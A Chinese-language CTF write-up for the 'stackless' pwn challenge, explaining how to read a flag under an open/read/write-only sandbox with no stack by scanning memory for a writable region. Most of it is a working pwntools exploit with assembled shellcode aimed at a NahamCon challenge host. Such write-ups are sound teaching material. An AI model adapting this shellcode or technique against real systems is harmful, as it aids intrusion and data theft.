# stackless

题目任然是给了源码，发现是一个执行shellcode程序，但是出题人将shellcode放到了一段随机的只读内存中，执行shellcode前还将所有寄存器和栈清空了，导致栈这个可写内存端没有了。并且开启了沙箱，只允许orw。但是orw又涉及到可写内存，由于没有泄露地址的地方，所以程序中得不到可写内存。问题就在如何获取一段可写内存了，可以看到内存段存在可写内存有bss、heap、stack段，这里只能用遍历内存的方法了。从rip开始也可以从0x7f0000000000，间隔0x2000，开始搜寻，接下来就是碰运气，在60秒之内能找到可写内存了。

## exp

```python
# -*- coding: UTF-8 -*-
from pwn import *


context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('challenge.nahamcon.com', 31986)
# libc = ELF('./libc-2.31.so')
# io = process('stackless')
#libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


pay = asm('''

lea rdi,[rip+0x1f5-7]
mov rsi,0
mov rdx,0
mov rax,2
syscall
mov r9,rax
/*search write memory*/
mov r8,0x1
lea r15,0x7ff000000000
loop:
add r8,0x10000
add r15,r8
/*read()*/
mov rdi,r9
mov rsi,r15
mov rdx,1024
mov rax,0
syscall
mov r12,rax
shr rax,32
cmp rax,0
jnz loop
/*write()*/
mov rdi,1
mov rsi,r15
mov rdx,r12
mov rax,1
syscall
/*exit*/
mov rdi,0
mov rax,60
syscall 

''')
# dbg()
pay = pay.ljust(0x200-7-4,'\x00')
pay += './flag.txt\x00'
sla('length\n',str(len(pay)))
sla('Shellcode\n',pay)
irt()

```
